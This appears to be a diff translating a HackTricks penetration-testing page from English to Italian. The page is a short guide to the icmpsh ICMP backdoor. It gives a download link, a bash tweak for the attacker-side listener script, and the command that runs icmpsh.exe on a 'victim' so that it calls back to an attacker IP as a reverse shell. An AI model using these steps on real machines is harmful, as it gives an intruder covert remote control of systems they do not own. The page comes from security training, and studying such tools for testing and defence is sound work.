@@ -1,31 +1,25 @@
 {{#include ../banners/hacktricks-training.md}}
 
-Download the backdoor from: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)
+Scarica il backdoor da: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)
 
-# Client side
+# Lato client
 
-Execute the script: **run.sh**
+Esegui lo script: **run.sh**
 
-**If you get some error, try to change the lines:**
-
+**Se ricevi un errore, prova a cambiare le righe:**
 ```bash
 IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
 IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
 ```
-
-**For:**
-
+**Per:**
 ```bash
 echo Please insert the IP where you want to listen
 read IP
 ```
+# **Lato Vittima**
 
-# **Victim Side**
-
-Upload **icmpsh.exe** to the victim and execute:
-
+Carica **icmpsh.exe** sulla vittima ed esegui:
 ```bash
 icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
 ```
-
 {{#include ../banners/hacktricks-training.md}}
